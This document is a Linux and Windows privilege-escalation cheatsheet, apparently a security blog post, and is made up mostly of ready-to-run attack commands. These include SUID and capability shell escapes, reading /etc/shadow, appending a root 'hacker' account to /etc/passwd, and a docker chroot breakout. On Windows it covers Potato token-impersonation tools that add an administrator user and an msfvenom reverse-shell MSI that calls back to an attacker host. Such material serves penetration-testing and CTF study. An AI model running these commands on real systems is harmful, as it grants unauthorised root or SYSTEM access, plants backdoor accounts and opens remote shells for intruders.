---
title: "Linux & Windows Privilege Escalation Cheatsheet"
description: "Comprehensive privilege escalation methodologies, commands, and vectors for Linux and Windows targets."
pubDate: "2024-04-15"
category: "Cheatsheet"
tags: ["privesc", "linux", "windows", "suid", "sudo", "potato", "impersonate"]
---

# Linux Privilege Escalation

## 1. Quick System Enumeration
```bash
# OS and Kernel Version
uname -a
cat /etc/os-release
cat /proc/version

# Current User and Group ID
id
whoami
groups

# Check Sudo Privileges
sudo -l

# Environment Variables & Path
env
echo $PATH
```

## 2. SUID & SGID Binaries
Find binaries running with elevated root permissions:
```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null

# Common GTFOBins SUID Exploits:
# /usr/bin/find
find . -exec /bin/sh -p \; -quit

# /usr/bin/nmap (old versions)
nmap --interactive
!sh

# /usr/bin/vim
vim -c ':!/bin/sh'

# /usr/bin/base64
base64 "/etc/shadow" | base64 --decode
```

## 3. Linux Capabilities
```bash
# List all capabilities
getcap -r / 2>/dev/null

# Exploiting cap_setuid
# If python3 has cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid+ep:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

## 4. Writable `/etc/passwd` & Sensitive Files
```bash
# Check if /etc/passwd is writable
ls -la /etc/passwd

# Generate a new root user password hash (password: "password123")
openssl passwd -1 -salt evil password123
# Output: $1$evil$TjGhkxV8XjDkF...

# Append to /etc/passwd
echo 'hacker:$1$evil$TjGhkxV8XjDkFRM4o7G681:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

## 5. Cron Jobs & Scheduled Tasks
```bash
# View user cronjobs
crontab -l

# View system crontabs
cat /etc/crontab
ls -la /etc/cron.*

# Check running processes with pspy (Process snooping)
./pspy64 -pf -i 1000
```

## 6. Docker & Container Breakouts
```bash
# If the current user is in the docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

# Windows Privilege Escalation

## 1. Initial System Reconnaissance
```powershell
# Basic System Info
systeminfo
hostname
[System.Environment]::OSVersion.Version

# Current Privileges
whoami /priv
whoami /groups
net user %username%

# Network Connections & Listening Ports
netstat -ano | findstr LISTENING
```

## 2. Token Impersonation (`SeImpersonatePrivilege`)
If `whoami /priv` reveals `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`:
```cmd
# Using GodPotato (Windows Server 2012 - 2022)
GodPotato-NET4.exe -cmd "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"

# Using SweetPotato
SweetPotato.exe -e Process -p C:\Windows\System32\cmd.exe -a "/c whoami"

# Using PrintSpoofer (Windows 10 / Server 2019)
PrintSpoofer64.exe -i -c cmd
```

## 3. AlwaysInstallElevated Policy
Check if both registry keys are set to `1` (`0x1`):
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If enabled, generate an elevated MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f msi -o update.msi

# Execute with elevated SYSTEM rights:
msiexec /quiet /qn /i update.msi
```

## 4. Unquoted Service Paths
```cmd
# Query vulnerable unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Example: C:\Program Files\Vulnerable App\Service.exe
# Place payload at C:\Program Files\Vulnerable.exe or C:\Program.exe
```

## 5. Automated Privilege Escalation Scripts
```cmd
# Windows:
winPEASx64.exe
PowerUp.ps1 -> Invoke-AllChecks

# Linux:
linpeas.sh
LinEnum.sh
linux-exploit-suggester.sh
```
